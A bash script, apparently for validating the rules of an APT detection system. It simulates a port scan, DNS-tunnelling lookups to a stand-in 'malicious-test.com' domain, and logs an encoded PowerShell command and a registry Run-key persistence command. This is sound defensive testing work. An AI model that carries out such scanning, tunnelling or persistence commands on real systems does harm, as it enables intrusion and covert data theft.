#!/bin/bash

# APT Detection System Testing Script
# This script simulates APT attack patterns for testing detection rules

echo "=== APT Detection System Testing ==="
echo "Starting attack simulation for rule validation..."

# Test 1: Port Scanning Simulation
echo "Test 1: Simulating port scan activity..."
for port in 22 80 443 445 3389; do
    timeout 1 bash -c "</dev/tcp/192.168.1.1/$port" 2>/dev/null
    timeout 1 bash -c "</dev/tcp/192.168.1.2/$port" 2>/dev/null
    timeout 1 bash -c "</dev/tcp/192.168.1.3/$port" 2>/dev/null
done

# Test 2: Suspicious PowerShell Activity
echo "Test 2: Simulating suspicious PowerShell execution..."
echo "powershell.exe -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUA" | logger -t "APT-Test"

# Test 3: DNS Tunneling Simulation
echo "Test 3: Simulating DNS tunneling..."
for i in {1..10}; do
    # Generate long DNS query with high entropy (Base64-like)
    query=$(openssl rand -base64 45 | tr -d '=' | tr '+/' 'ab')
    nslookup "${query}.malicious-test.com" >/dev/null 2>&1
    sleep 1
done

# Test 4: Large File Transfer Simulation  
echo "Test 4: Simulating large data transfer..."
# This would typically involve actual file transfer, simulated here
echo "Simulating 50MB file transfer to external IP..." | logger -t "APT-Test"

# Test 5: Registry Persistence Simulation (Windows only)
if [[ "$OSTYPE" == "msys" || "$OSTYPE" == "cygwin" ]]; then
    echo "Test 5: Simulating registry persistence..."
    echo "reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v WindowsUpdate /d C:\temp\malware.exe" | logger -t "APT-Test"
fi

echo "Testing completed. Check Kibana dashboard for detection results."
echo "Expected detections:"
echo "- Port scanning activity (medium severity)"
echo "- Suspicious PowerShell execution (high severity)" 
echo "- DNS tunneling attempts (high severity)"
echo "- Large data transfer (medium severity)"
echo "- Registry persistence (medium severity)"
